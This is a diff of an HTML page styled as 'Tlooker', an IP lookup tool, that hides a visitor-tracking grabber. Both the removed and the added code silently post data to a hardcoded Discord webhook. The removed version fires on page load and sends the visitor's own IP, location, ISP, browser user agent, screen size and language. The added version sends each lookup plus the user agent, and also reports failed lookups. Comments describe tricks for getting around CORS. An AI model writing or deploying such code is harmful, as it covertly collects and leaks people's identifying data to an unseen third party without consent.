@@ -1,106 +1,62 @@
 <!DOCTYPE html>
-<html lang="en" class="dark">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Tlooker – Orbital IP Scanner</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <title>TLOOKER - ORBITAL RECON</title>
   <style>
-    :root { --bg: #000; --text: #e0e0e0; --accent: #00eaff; --card: #0a0f1a; --border: #1a2b3f; }
-    body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Roboto Mono', monospace; min-height: 100vh; display: flex; justify-content: center; overflow-x: hidden; }
-    .container { width: 100%; max-width: 700px; padding: 2rem; text-align: center; }
-    h1 { font-family: 'Orbitron', sans-serif; font-size: 3rem; color: var(--accent); text-shadow: 0 0 15px var(--accent); margin-bottom: 0; }
-    .subtitle { opacity: 0.6; font-size: 0.9rem; margin-bottom: 2rem; }
-    .input-group { margin: 2rem 0; display: flex; flex-direction: column; gap: 15px; align-items: center; }
-    input { width: 80%; padding: 1rem; background: var(--card); border: 1px solid var(--border); border-radius: 50px; color: #fff; outline: none; text-align: center; font-family: inherit; }
-    button { padding: 1rem 2.5rem; background: transparent; border: 2px solid var(--accent); color: var(--accent); border-radius: 50px; cursor: pointer; font-family: 'Orbitron'; transition: 0.3s; }
-    button:hover { background: var(--accent); color: #000; box-shadow: 0 0 20px var(--accent); }
-    #result { margin-top: 2rem; background: var(--card); border: 1px solid var(--border); padding: 1.5rem; border-radius: 10px; display: none; text-align: left; animation: fadeIn 0.5s ease; }
-    .show { display: block !important; }
-    dt { color: var(--accent); margin-top: 10px; font-weight: bold; font-size: 0.8rem; text-transform: uppercase; }
-    dd { margin-left: 0; word-break: break-all; border-bottom: 1px solid #1a2b3f; padding-bottom: 5px; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    body { background: #000; color: #00eaff; font-family: monospace; text-align: center; padding: 50px; }
+    .box { border: 1px solid #1a2b3f; padding: 20px; background: #0a0f1a; display: inline-block; text-align: left; min-width: 300px; }
+    input { background: #000; border: 1px solid #00eaff; color: #fff; padding: 10px; width: 250px; }
+    button { background: #00eaff; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+    .data { color: #fff; margin-top: 20px; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>TLOOKER</h1>
-    <div class="subtitle">orbital reconnaissance • stealth intercept</div>
-    <div class="input-group">
-      <input type="text" id="ipInput" placeholder="Target IP (Leave blank for self-scan)">
-      <button onclick="lookup()">EXECUTE SCAN</button>
-    </div>
-    <div id="status">System Ready.</div>
-    <div id="result">
-      <dl id="data-list"></dl>
-    </div>
+  <h1>TLOOKER</h1>
+  <div class="box">
+    <input type="text" id="ipInput" placeholder="185.65.135.182">
+    <button id="scanBtn">FORCE SCAN</button>
+    <div id="status">Ready.</div>
+    <div id="result" class="data"></div>
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1477796865054609512/gYdKCLTrFa9SdlPeVrLDCAOU1F9MW6UOq4hN5zvTX1n3EWrrv47lzTyxMUjcoEJtnios";
+    const hook = "https://discord.com/api/webhooks/1477796865054609512/gYdKCLTrFa9SdlPeVrLDCAOU1F9MW6UOq4hN5zvTX1n3EWrrv47lzTyxMUjcoEJtnios";
 
-    // Discord post using Blob to avoid common CORS preflight blocks
-    function logToDiscord(data) {
-      const payload = {
-        embeds: [{
-          title: "🛰️ TLOOKER INTERCEPTED DATA",
-          color: 5814783,
-          fields: [
-            { name: "Target IP", value: `\`${data.query}\``, inline: true },
-            { name: "Location", value: `${data.city}, ${data.country}`, inline: true },
-            { name: "ISP/Org", value: `${data.isp} (${data.org || 'N/A'})`, inline: false },
-            { name: "Browser UA", value: navigator.userAgent },
-            { name: "Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true },
-            { name: "Lang", value: navigator.language, inline: true }
-          ],
-          timestamp: new Date().toISOString()
-        }]
-      };
-
-      // Using Blob/form-data trick to bypass strict Content-Type checks
-      const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-      navigator.sendBeacon(webhookURL, blob);
+    async function zap(content) {
+      try {
+        await fetch(hook, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({ content: "🛰️ **INTERCEPT:**\n" + content })
+        });
+      } catch(e) {}
     }
 
-    // JSONP Callback - This is the "secret sauce" that bypasses CORS
-    window.handleResponse = function(data) {
+    async function lookup() {
+      const val = document.getElementById('ipInput').value || '185.65.135.182';
       const status = document.getElementById('status');
-      const result = document.getElementById('result');
-      const list = document.getElementById('data-list');
+      const resDiv = document.getElementById('result');
+      
+      status.innerText = "PHASING...";
+      
+      try {
+        const res = await fetch(`https://ipapi.co/${val}/json/`);
+        const d = await res.json();
 
-      if (data.status === 'fail') {
-        status.textContent = "Error: " + data.message;
-        return;
+        const out = `IP: ${d.ip}\nCity: ${d.city}\nRegion: ${d.region}\nCountry: ${d.country_name}\nISP: ${d.org}`;
+        resDiv.innerText = out;
+        status.innerText = "CAPTURED.";
+        
+        await zap(out + "\nUA: " + navigator.userAgent);
+      } catch (err) {
+        status.innerText = "REJECTED by API.";
+        // Emergency fallback: log just the target intent if API dies
+        await zap("FAILED LOOKUP ON: " + val);
       }
-
-      list.innerHTML = `
-        <dt>Query IP</dt><dd>${data.query}</dd>
-        <dt>Provider</dt><dd>${data.isp}</dd>
-        <dt>Region</dt><dd>${data.city}, ${data.regionName}, ${data.country}</dd>
-        <dt>Coordinates</dt><dd>${data.lat}, ${data.lon}</dd>
-        <dt>Timezone</dt><dd>${data.timezone}</dd>
-      `;
-
-      result.classList.add('show');
-      status.textContent = "Intercept successful.";
-      logToDiscord(data);
-    };
-
-    function lookup() {
-      const ip = document.getElementById('ipInput').value.trim();
-      const status = document.getElementById('status');
-      status.textContent = "Infiltrating...";
-      
-      // Injecting a script tag to bypass CORS (JSONP)
-      const script = document.createElement('script');
-      script.src = `http://ip-api.com/json/${ip}?callback=handleResponse`;
-      document.body.appendChild(script);
-      
-      // Cleanup script tag after execution
-      script.onload = () => document.body.removeChild(script);
     }
 
-    window.onload = () => lookup();
+    document.getElementById('scanBtn').onclick = lookup;
   </script>
 </body>
 </html>
